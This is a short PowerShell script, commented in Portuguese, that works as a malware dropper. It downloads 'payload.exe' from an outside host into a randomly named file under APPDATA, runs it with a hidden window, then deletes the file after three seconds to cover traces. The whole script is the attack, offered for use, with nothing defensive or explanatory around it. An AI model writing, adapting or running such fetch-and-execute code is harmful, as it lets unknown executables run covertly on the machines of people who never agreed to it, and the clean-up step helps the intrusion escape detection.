# exec.ps1 - Usando SEU site
$url = "https://testedessamerda.squareweb.app/payload.exe"
$path = "$env:APPDATA\$([System.IO.Path]::GetRandomFileName()).exe"

# Download do SEU site
(New-Object Net.WebClient).DownloadFile($url, $path)

# Executar
Start-Process -FilePath $path -WindowStyle Hidden

# Limpar depois
Start-Sleep 3
Remove-Item -Path $path -Force
